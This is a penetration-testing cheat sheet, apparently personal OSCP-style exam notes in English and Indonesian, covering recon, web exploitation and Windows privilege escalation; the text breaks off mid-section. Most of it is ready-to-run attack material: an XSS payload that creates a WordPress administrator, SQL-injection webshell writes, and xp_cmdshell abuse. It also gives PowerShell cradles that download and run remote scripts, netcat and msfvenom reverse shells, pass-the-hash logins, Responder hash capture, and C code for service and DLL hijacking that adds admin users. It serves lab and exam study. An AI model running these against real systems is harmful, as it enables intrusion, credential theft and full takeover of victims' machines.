sudo nmap -sV -oN nmap/pascha_full -vvv 192.168.182.155 -p- -T5
```
- Quickwin
```bash
sudo nmap -sVS -oA nmap/astronaut -vvv 192.168.207.12 --script "vuln"
```
- No more leads
```bash
sudo nmap -sCVS -oA nmap/astronaut_full -vvv 192.168.207.12 -p-
sudo nmap -p80 --script=http-enum 192.168.50.20
```
- Ping is blocked
```bash
sudo nmap -sCVS -oA nmap/astronaut -vvv 192.168.207.12 -Pn 
```
- Windows
```bash
sudo nmap -sCVS -oA nmap/nagoya --script=smb-vuln-* -vvv 192.168.239.21
```
- Nmap Automator
```bash
/opt/nmapAutomator.sh  --host 192.168.157.99 --type All -o nmap
```

2. Subdomain brute
```bash
gobuster dns -d marketing.pg -w /opt/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -i

dnsrecon -d megacorpone.com -t brt -D /opt/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
```

3. Web dir brute (PASTIIN CEK FILE&DIR BAHAYA YG COMMON, .env, .git, etc.)
```bash
feroxbuster -u http://192.168.229.244/0000 -x pdf,config,json,zip,tar.gz -o feroxbuster_recursive_0000 -w /opt/wordlists/seclist/Discovery/Web-Content/big.txt -s 200,301,302,403 --smart

feroxbuster -u http://192.168.234.249/ -x pdf,config,json,zip,tar.gz -o feroxbuster/192.168.234.249 -w /opt/wordlists/seclist/Discovery/Web-Content/big.txt -s 200,301,302,403 --smart --no-recursion


gobuster dir --url "http://192.168.152.226/" -w /opt/wordlists/SecLists/Discovery/Web-Content/big.txt -o gobuster.log -x php

zip, json, tar.gz, php, jsp, do, txt, or html
```
```bash
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern -o gobuster_api.log

pattern >> File yang isinya pattern:
ex:
{GOBUSTER}/v1
{GOBUSTER}/v2
```
```bash (kalo dah dapet, terutama API, brute terus sampe directory paling terakhir)
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt -o gobuster_api_admin.log
```

## XSS (module pen-200, https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/)
1) Payload to steal wp-nonce (CSRF token wordpress)
```js
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

2) Encode payloadnya + https://minify-js.com/
```js
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

3) Cara aktifinnya
```html
<script>eval(String.fromCharCode(118,97...))</script>
```

# Foothold
1. Linux Stabilize Shell
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm-256color
CTRL+z
stty raw -echo;fg 

(WORKS PAKE export TERM=xterm-256color)
```

2. Windows download
```cmd
certutil -urlcache -f http://192.168.45.205:8000/nc.exe nc.exe
```
```cmd
iwr http://172.16.100.64/Loader.exe -OutFile C:\Users\Public\Loader.exe 
iwr -url http://172.16.100.64/Loader.exe -OutFile C:\Users\Public\Loader.exe 
```

3. Windows revshell
```cmd
nc.exe 192.168.45.205 80 -e cmd.exe
```

4. ASPX MSFVenom Reverse shell
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.45.205 LPORT=80 -f aspx > shell.aspx
```

5. ## SQL Injection (SELALU PEKA SAMA BLIND SQLI)

1. SQL Injection File Write, MSSQL Code execute, etc.
https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection
```php
select "<?php echo shell_exec($_GET['c']);?>" into OUTFILE '/var/www/html/shell.php';

cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -

' /*!50000union*/ select 1,2,3,4,5,6,7,8,’data://text/plain,<?php echo system(“uname -a”);?>’-- -

' UNION ALL SELECT NULL,NULL,"<?php echo "hello world"; ?> INTO OUTFLIE "/var/www/vhosts/example.com/foobar.php"

' UNION SELECT '<?php system($_GET["cmd"]);?>', null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //

(KALO RETURN ERROR, TETEP CEK FILENYA, BISA JADI TETEP TERWRITE)
```
```cmd
offsec' OR 1=1 -- //

' or 1=1 in (select @@version) -- //

' or 1=1 in (SELECT * FROM users) -- //

' or 1=1 in (SELECT password FROM users) -- //

Kalo di search feature (biasanya dia pake like, makannya kita pake % aja)

%' UNION SELECT database(), user(), @@version, null, null -- //

UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata

UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...

UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...

UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...

' union select 1,2,group_concat(table_name, 0x7C, column_name) from information_schema.columns -- - //
```
```cmd blind
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //

http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```

## MSSQL Code Execute xp_cmdshell() >> BISA PASS THE HASH JUGA.
```cmd
enum_db
use ms_db;=
enum_users;

impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```
> MSSQL INJECTION (capstone sqli vm4)
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
```cmd
Dari medtech (chall 1 bisa ini), case: Blind SQLi on Login

1'+or+1=1+--+-+//
asd'%3bselect+@@version;--+-+// >> ini valid woi. Gk ush pake ; juga gpp
asd'+select+@@version+--+-+//
asd'+EXEC+sp_configure+'show+advanced+options',+1+--+-+//
asd'+RECONFIGURE+--+-+//
asd'+EXEC+sp_configure+'xp_cmdshell',+1+--+-+//
asd'+RECONFIGURE+--+-+//
asd'+EXEC+xp_cmdshell+'powershell+-e+JABzA......AfQAgAHMAbABlAGUAcAAgADAALgA4AH0A',+1+--+-+//
```


## POSTGRESQLINJECTION (capstone sqli vm3)
IKUTIN AJA BISA RCE
https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution


6. In case of PHP SSRF, try to use header() function. >> PG Symbolic #30
(wkhtmltopdf)
```php
<?php
header('Location: file:///Windows/System32/Drivers/etc/hosts');
?>
```
```php
<?php
header('Location: file:///etc/passwd');
?>
```

7. Invoke Execute Cradle (IEX) (Check catetan CRTP)
```cmd
powershell.exe -c "iex (New-Object Net.WebClient).DownloadString('http://192.168.45.168:8000/powercat.ps1');powercat -c 192.168.45.168 -p 1234 -e powershell"

powershell.exe -c iex (New-Object Net.WebClient).DownloadString('http://192.168.45.168:8000/Invoke-PowerShellTcpEx.ps1')

cmd /c powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.45.174:8000/Invoke-PowerShellTcpEx.ps1')
```

8. Utilize base64 payload delivery
```cmd
;echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguNDUuMTU1IDQ0NSA+L3RtcC9m | base64 -d | bash
```

9. Windows responder and impacket smbserver.py
- xp_dirtree + impacket smb to steal the hash
- or if there's SSRF

10. Xfreerdp / RDP
```cmd
xfreerdp /v:192.168.199.61 /dynamic-resolution /u:offsec /p:lab /cert:ignore /drive:shatternox,. +clipboard

== PAKE DRIVE BIAR BISA COPY FILE DARI RDP KE KALI KITA

xfreerdp /v:192.168.187.151 /dynamic-resolution /u:student /p:lab /cert:ignore +clipboard
xfreerdp /u:student /p:lab /v:192.168.87.151
```

11. Installing malicious wp plugins
```php (HARUS ADA COMMENTNYA AJA)
/**
 * Plugin Name: My Custom Plugin
 * Plugin URI: http://example.com/my-custom-plugin
 * Description: A simple WordPress plugin example to add a custom shortcode.
 * Version: 1.0
 * Author: Your Name
 * Author URI: http://example.com
 */

<revshell code>
```

12. IIS Windows log (mungkin mau log poisoning, lfi to rce) / Windows Web Logs
```cmd
C:\inetpub\logs\LogFiles\W3SVC1\

C:\xampp\apache\logs\access.log
```

13. PHP Wrapper LFI (Base64 and Code Exec)
https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet
>> KALO ADA AKSES KE DALAM SERVERNYA, DAN BISA LFI. TARO REVSHELL AJA DI /dev/shm JGN /tmp. Apparently /tmp bisa beda-beda tiap user.

```cmd
php://filter/convert.base64-encode/resource=<filename>
data://text/plain,<php_code>
data://text/plain;base64,<base64_php_code>&cmd=ls

curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"

biar aman bisa pake base64 data wrapper.

curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

## For xp_dirtree (access mssql with mssqlclient.py)
```cmd
python3 mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@sequel.htb

OR

impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth

select @@version;
SELECT name FROM sys.databases;
SELECT * FROM offsec.information_schema.tables;
select * from offsec.dbo.users;
or
use offsec;
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
select * from users
```
```bash (impacket)
python3 smbserver.py nox_share . -smb2support
```
```sql (di CLI mssqlmya)
xp_dirtree "\\10.10.10.10\nox_share"
```
> Get the NTLMv2 hash and crack it, or just use hash to winrm


## For Responder

> Start a listener
```bash
sudo responder -I tun0 -wd -v

Kirim requestnya
```
> Crack the NTLMv2 hash with john
```bash
john ntlmv2_hash --wordlist=/opt/wordlists/rockyou.txt
```
> Access the server with crackmapexec or evil-winrm or impacket-psexec or impacket-wmiexec or impacket-smbexec
```bash
crackmapexec winrm 192.168.123.165 -d heist.offsec -u enox -p california -x whoami
```
```bash
evil-winrm -i 192.168.123.165 -u enox -p california
evil-winrm -i 192.168.199.212 -u Administrator -H 7a38310ea6f0027ee955abed1762964b
```
```bash
impacket-psexec admin:UWyBGeTp3Bhw7f@10.5.5.30
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.199.212
```
```bash
impacket-smbexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.199.212
```
```bash
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.199.212
```

# Windows Privesc (Privilege Escalation, Windows Privilege Escalation, Lateral Movement)
>> SELALU WINPEAS DULU WOI, CARI HARDCODED SECRETS, TERUTAMA DI MESIN STAND ALONE. SUKA ADA DAN 90% ADA.
```cmd
cmdkey /list >> Check this suka ada creds
```
https://lolbas-project.github.io/
https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

>> CHECK SEMUA HASIL `whoami /priv` DI TABLE INI. INSTANT PRIVESC
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens

https://github.com/gtworek/Priv2Admin

>> ENUM USING CRTP NOTES
>> Bloodhound
```bash
Just run bloodhound. Don't forget to turn on Neo4j

sudo neo4j console
```

## From The Course

## INFORMATION THAT HAVE TO BE OBTAINED

1) Username and hostname 
2) Group memberships of the current user 
3) Existing users and groups 
4) Operating system, version and architecture 
5) Network information 
6) Installed applications
> SELALU CEK Downloads, Documents, Desktop, Recycle Bin directory.
7) Running processes


1) Username and hostname 
> `whoami`
<hostname>\<username>

"The hostname often can be used to infer the purpose and type of a machine. For example, if it is WEB01 for a web server or MSSQL01 for a MSSQL server."

2) Group memberships of the current user  
> `whoami /groups`
display all groups our current user is a member of

"BUILTIN\Remote Desktop Users. Membership of this group offers the possibility to connect to the system via RDP"

3) Existing users and groups 
> `Get-LocalUser`
list of all local users
> Liat mana yang admin dan enabled

> `net user <nama_user>`
check what groups a user is member of

> `net localgroup or Get-LocalGroup`
enumerate the existing groups on the machine
- Remote Desktop Users >> Group agar bisa RDP
- Remote Management Users >> Group agar bisa Winrm (evil-winrm, winrs, ps remoting)

> Interesting Standard Groups
Members of Backup Operators can backup and restore all files on a computer, even those files they don't have permissions for. We must not confuse this group with non-standard groups such as BackupUsers in our example.

Members of Remote Desktop Users can access the system with RDP, while members of Remote Management Users can access it with WinRM.

> `Get-LocalGroupMember <nama_group>`
list semua user di dalam 1 group
> Cari user mana yang member dari `Get-LocalGroupMember Administrators`. Bisa jadi next target.
bisa juga `net localgroup Administrators`

4) Operating system, version and architecture 
`systeminfo`
Get-LocalGroupMember Administrators

5) Network information 
> `ipconfig /all`
list all network interfaces

> `route print`
display the routing table, which contains all routes of the system. output of this command is useful to determine possible attack vectors to other systems or networks.

> `netstat -ano`
display all active TCP connections as well as TCP and UDP ports

> Guna buat portforwarding.

6) Installed applications
> `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

or

> `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname,version`

or gk ush di | biar keluar smw.


check all installed applications
> GUNA kalo ada Keepas password manager or Firefox kyk kemarin.
> 7-Zip bisa ada CVE, cek version (https://github.com/kagancapar/CVE-2022-29072). 7-Zip 21.07 (x64) is vulnerable. (TAPI CEK DULU VERSION MESINNYA, KALO Program Files (x86) / 32bit, gk bisa)

> XAMPP bisa ada hidden files
> check Downloads dir juga.

7) Running processes
`Get-Process` or `tasklist`
view the running processes of the system

`Get-Process | Select-Object Name, Path`
cari pathnya juga
or
`tasklist /fo csv /nh | ConvertFrom-Csv | Select-Object ImageName, Path`


## XAMPP
> ENUM DBNYA `C:\xampp\mysql\bin\mysql.exe` commandnya kyk linux.
Default creds ==> root, no password
> CEK CONFIGNYA DAN WRITTEN FILES (GK LANGSUNG KELIATAN, HARUS BACA)
```cmd
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

C:\xampp\passwords.txt >> default passwords for the different XAMPP components (kalo datanya unmodified gk guna.)
C:\xampp\mysql\bin\my.ini >> configuration file for MySQL, bisa aja gk ada akses. Tapi kalo dapet user baru bisa aja jadi punya akses.

BANYAK FILE LAIN YG POTENSIAL JUGA KYK FILE BIKINAN USERNYA.
```

## SEARCH FOR INTERESTING FILES ON USER DIRECTORY
1. Auto search files [PENTING, IMPORTANT]
```cmd
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.kdbx,*.log,*.config,*.xml,*.json,*.cfg -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users\ -Include * -File -Recurse -ErrorAction SilentlyContinue
```

## Accessing other user via CMD (sudo di windows)
1. runas (BISA DIPAKAI KALO KITA RDP DI MESIN WINDOWSNYA. Kalo dari kyk evilwin-rm ato shell lain gk bisa)

"Without access to a GUI we cannot use Runas since the password prompt doesn't accept our input in commonly used shells, such as our bind shell or WinRM."

```cmd
runas /user:backupadmin cmd
```
"Alternatively, if the target user has the *Log on as a batch job* access right, we can schedule a task to execute a program of our choice as this user. Furthermore, if the target user has an active session, we can use PsExec from Sysinternals."


## Decoding .ini base64 string
```py
import base64

encoded_text = "ewANAAoAIAAgACIAYgBvAG8AbABlAGEAbgAiADoAIAB0AHIAdQBlACwADQAKACAAIAAiAGEAZABtAGkAbgAiADoAIABmAGEAbABzAGUALAANAAoAIAAgACIAdQBzAGUAcgAiADoAIAB7AA0ACgAgACAAIAAgACIAbgBhAG0AZQAiADoAIAAiAHIAaQBjAGgAbQBvAG4AZAAiACwADQAKACAAIAAgACAAIgBwAGEAcwBzACIAOgAgACIARwBvAHQAaABpAGMATABpAGYAZQBTAHQAeQBsAGUAMQAzADMANwAhACIADQAKACAAIAB9AA0ACgB9AA=="
decoded_bytes = base64.b64decode(encoded_text)
decoded_text = decoded_bytes.decode('utf-8')
print(decoded_text)
```

## Extracting Powershell History (.bash_history Windows), suka ada hardcoded secrets. PSReadline. #powershell logs

1. Cek Path file historynya
```cmd
Get-History 
(Get-PSReadlineOption).HistorySavePath
```
2. Liat isi dari path historynya, ex:
```cmd
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
3. Kalo ada command Start-Transcript di historynya, baca pathnya.
```cmd
Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
```
```cmd
type C:\Users\Public\Transcripts\transcript01.txt
```
4. Kalo dari GUI event viewer bisa gini (GUNA, KRN SUKA GK ADA kalo pake cara di atas)
```
Buka Event Viewer > Applications and Services Logs > Microsoft > Windows > PowerShell > Operational
```
Event 4104 is Powershell Script Block Logging

Di panel kanan ada "Filter Current Log" > Masukin Event ID 4104


## Powershell Remoting (kalo kali linux kita bisa akses mesinnya dan males proxychain).
```cmd
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```
or
```cmd
winrs -r:CLIENTWK220 -u:daveadmin -p:qwertqwertqwert123!! "cmd /c"
```
or
```cmd (kalo memang user kita ada akses ke komputernya)
$sess = New-PSSession -ComputerName dcorp-dc
Enter-PSSession $sess
```
or
```cmd
winrs -r:dcorp-dc cmd 
```
NOTE: KALO KALI LINUX KITA BISA AKSES ATAU POWERSHELL REMOTINGNYA ERROR, MENDING `evil-winrm` or `proxychains evil-winrm`

```cmd
evil-winrm -i 192.168.223.220 -u daveadmin -p 'qwertqwertqwert123!!'
proxychains evil-winrm -i 192.168.223.220 -u daveadmin -p 'qwertqwertqwert123!!' 
```


## Service Binary Hijacking [PENTING] #IMPORTANT
>> BUAT TRIGGER SERVICE, SELALU COBA MATIIN DAN NYALAIN SERVICE. JGN CUMA RESTART AJA. [PENTING]

Scenario: KITA PUNYA PERMISSION BUAT REPLACE SERVICE BINARY. Write or Full Access (fullaccess)
>> BUAT MEMUDAHKAN CHECK PAKE PowerUp.ps1 aja.
```cmd
iwr -uri http://192.168.45.168:8000/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```
>> Penjelasan di module, `Install-ServiceBinary` PowerUP rusak karena dia cek pake "Get-ModifiablePath" yang di mana kalo Servicenya jalan pake argument yg ada stripnya (-) dia error. Ex:
- C:\xampp\mysql\bin\mysqld.exe >> aman
- C:\xampp\mysql\bin\mysqld.exe argument >> aman
- C:\xampp\mysql\bin\mysqld.exe argument --conf=C:\asd\as.conf >> RUSAK

>> MAKANNYA HARUS SELALU CEK MANUAL SMW. INGET KASUSNYA AlwaysInstallElevated? AbuseFunction PowerUp.ps1 GK SELALU BEKERJA, PADAHAL PROGRAMNYA BENERAN VULNERABLE.

1. List installed windows services
```cmd (CUMA BISA KALO KITA KONEK PAKE RDP)
Get-Service
```
```cmd (CUMA BISA KALO KITA KONEK PAKE RDP)
Get-CimInstance
```
```cmd
Get-WmiObject
```
```cmd
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
Get-CimInstance -ClassName win32_service | Select Name,State,PathName

Get-CimInstance -ClassName win32_service | Select-Object Name, State, PathName | Where-Object { $_.State -eq 'Running' -and $_.PathName -notmatch 'System32' }

Get-CimInstance -ClassName win32_service | Select-Object Name, State, PathName | Where-Object { $_.PathName -notmatch 'System32' }
```
>> Kalo binarynya bukan di C:\Windows\System32, berarti itu user-installed dan worth checking.
>> jgn yang dalan C:\Windows juga harusnya
>> BISA JADI BINARY SUSPICIOUSNYA ADA DI SYSTEM32. ASLI

2. Enumerate permission on the service binaries
```cmd
icacls "C:\xampp\apache\bin\httpd.exe"
icacls "C:\xampp\mysql\bin\mysqld.exe"
or
Get-Acl "C:\xampp\apache\bin\httpd.exe"
```
icacls permission table

MASK	PERMISSIONS
F	Full access
M	Modify access >> READ WRITE EXECUTE DELETE
RX	Read and execute access
R	Read-only access
W	Write-only access
https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls

Note: **the only difference between full access and modify was ownership changing.**


>> Liat group dan permissionnya. 
>> Kalo user kita belongs to the group yang punya akses kyk **Write (W)** or **Full Access (F)** or **Modify (M)**, HAJAR.
>> Kalo kita cuma punya **Read and Execute (RX)**, CHECK DLL HIJACKING
>> check `whoami /groups`

3. Sama kyk linux, kalo kita punya full akses ke service yg dijalanin, kita tinggal timpa binarynya sama malicious binary dan restart servicenya.

ex: Malicious binary (harusnya bisa pake msfvenom aja sih)
```c (adduser.c)
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
4. Compile since kita tau targetnya 64bit pake ini
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
Note: kalo 32bit pake ini, i686-w64-mingw32-gcc

5. Transfer binarynya dan timpa ke lokasi servicenya
```cmd
iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```
6. Tinggal stop dan start lagi
```cmd
Stop-Service mysql
Start-Service mysql
or 
Restart-Service mysql
or
net stop mysql
net start mysql
```
>> KALO DENIED GMN? This is expected as most services are only managed by administrative users.
>> **If the service Startup Type is set to "Auto", we may be able to restart the service by rebooting the machine.**

7. check the Startup Type of the targeted service
```cmd
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<nama_servicenya>'}
ex:
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```
8. Buat rebooting machine, kita butuh privilege `SeShutDownPrivilege`
```cmd
whoami /priv
```
>> Kalo Disabled, jgn khawatir. "The Disabled state only indicates if the privilege is currently enabled for the running process. In our case, it means that whoami has not requested and is not currently using the SeShutdownPrivilege privilege."

9. Reboot mesinnya
```cmd
shutdown /r /t 0
```
10. Boom! tinggal relogin, runas pake akun yg baru, atau sekalian aja tambahin usernya ke group RDP di payloadnya.
```c (adduser.c, additional)
i = system ("net localgroup \"Remote Desktop Users\" dave2 /add");
```

Notes from VM2.

1. icacls C:\BackupMonitor\BackupMonitor.exe
>> Permission kita di situ cuma RX, gk bisa apa-apa.
>> Tapi NT AUTHORITY\Authenticated Users:(I)(M)  punya permission M (Modify Access)
>> setelah cek `whoami /groups` kita member dari NT AUTHORITY\Authenticated Users

Apa itu (M)? Modify.
 "Modify" permission. This permission allows users to **read, write, execute, and delete** the file"

2. As usual
```cmd
iwr 192.168.45.168:8000/pay.exe -outfile pay.exe
move C:\BackupMonitor\BackupMonitor.exe C:\BackupMonitor\BackupMonitor.exe_original
move .\pay.exe C:\BackupMonitor\BackupMonitor.exe
```
3. Restart service
```cmd
net stop BackupMonitor
net start BackupMonitor
```
4. Dapet shell. Hm.. OKELAH POKOKNYA SELALU COBA HIJACK SERVICE BINARY DI LOCATION SUSPICIOUS EVENTHOUGH RX AJA. 


## Service DLL Hijacking (DLL Hijacking, dllhijacking, DLLHIJACKING) [PENTING] #IMPORTANT

> Tips buat exam:
	- KUNCINYA ADALAH: **SUSPICIOUS BINARY WITH (RX) PERMISSION**
	- Kalo lu udah yakin ada DLL Injection krn g ada vektor lain. Unlikely bisa pake procmon di mesinnya. Download dan Reverse engineer aja.
	- Taro dllnya di directory .exe servicenya. (Ikutin dll search order)
> `strings EnterpriseService.exe | grep "dll"` >> LIAT CAPSTONE WINDOWS PRIVESC.
> ATO GK CHECK LOG OR CLUE SEKITAR.

**Kalo tidak tahu .dll nya mau taro di mana, ikutin dll search order**
1. The directory from which the application loaded (BIASANYA LANGSUNG DI SINI)
2. The system directory
3. The 16-bit system directory
4. The Windows directory.
5. The current directory.
6. The directories that are listed in the PATH environment variable.

> Konsepnya sama aja kyk Service Binary Hijacking, cuma di dll aja.
1) Cari suspicious services
2) Check permission 
3) Kalo gk writable, check processnya (procmon, atau reverse engineer binarynya) 
4) Dia ada manggil dll apa aja > dll mana yang bisa writable atau dihijack 
5) Generate malicious dll.
6) Transfer and hijack.

POWERUP JUGA BISA DETECT.

1. Enumerate services
```cmd
Get-CimInstance -ClassName win32_service | Select-Object Name, State, PathName | Where-Object { $_.PathName -notmatch 'System32' }
```
>> Kyk tadi, cari service yang nondefault dan non system

2. Check permission ke servicesnya
```cmd
icacls C:\Users\steve\Documents\BetaServ.exe
```
>> Kita cuma punya RX. Therefore need to investigate more.
>> The standard procedure in a penetration test would be to copy the service binary to a local machine and analyze it. (REVERSE KYK FELIX)
>> Di lab, harusnya udah ada procmon. C:\tools\Procmon\Procmon64.exe (double click aja)
>> Gw juga udah sediain di /opt. Tinggal transfer. UNLIKELY DIPAKE KRN BUTUH GUI DAN ADMIN

3. Buka Procmon64.exe (BUTUH GUI DAN ADMINISTRATIVE PRIVILEGE)
4. Filter > **Process Name** **Is** **BetaServ.exe (nama service binarynya)** then **Include**
5. Restart servicenya since kita bisa execute.
```cmd
Stop-Service BetaService
Start-Service BetaService
Restart-Service BetaService
or
net stop BetaService
net start BetaService
```
6. Check Procmon lagi. Ada bnyk event yg involves bnyk dll.
7. Cari DLL mana yang bisa dioverwrite, atau dia ada nyari DLL di folder yang kita bisa write gk.
8. Kalo ada, tinggal bikin DLL malicious, overwrite, dan restart servicenya.
9. Create the DLL. Bisa pake msfvenom jg.
```cmd
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.168 LPORT=4444 -f dll -o CRYPTBASE.DLL
```
>> NOTE: KRN BUAT DLL, MSFVENOM CUMA SEDIA STAGED PAYLOAD, HARUS TERIMANYA PAKE multi/handler

```c adduser.cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
  	    i = system ("net localgroup 'Remote Desktop Users' dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
10. Compile
```bash
x86_64-w64-mingw32-gcc adduser.cpp --shared -o myDLL.dll
```
11. Transfer
```bash
iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll

>> move ke tempat dll yang mau dihijack
```
12. Restart service, dan boom.
```bash
Restart-Service BetaService
net user
net localgroup administrators
```

## Service Unquoted Service Paths (UnquotedServicePath) [PENTING] #IMPORTANT

POWERUP JUGA BISA DETECT. CUMA AGAIN, KALO ABUSE FUNCTIONNYA GK BISA, CEK ULANG.

> We can use this attack **when we have Write permissions to a service's main directory** or subdirectories but cannot replace files within them.
> Example: ada service dengan path di bawah
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe

Windows bakal nyari exenya dengan urutan atas ke bawah kyk gini:
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe

Tinggal cari folder mana yang writable pake icacls <folder_name>
> Palingan writablenya yang "C:\Program Files\Enterprise Apps"

Berarti kita tinggal bikin malicious binary namanya "Current.exe" di C:\Program Files\Enterprise Apps\Current.exe
lalu restart servicenya. Semudah itu,

1. Cari unquoted service path yang bukan di C:\Windows\ directory.
```cmd
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
>> pake cmd.exe

or bs kyk tadi

Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object { $_.PathName -notmatch 'System32' }
```
>> Cari yang di nama foldernya ada Space.

2. Check kita bisa restart servicenya apa ngga
```cmd
icacls "C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe"
```
3. Kalo bisa, check mana folder yang bisa kita write.
```cmd
icacls C:\
icacls "C:\Program Files"
icacls "C:\Program Files\Enterprise Apps"
```
>> Ternyata "C:\Program Files\Enterprise Apps\" writable.

4. Tinggal bikin "Current.exe" malicious dan taro di C:\Program Files\Enterprise Apps\Current.exe
```cmd
iwr -uri http://192.168.119.3/adduser.exe -Outfile Current.exe
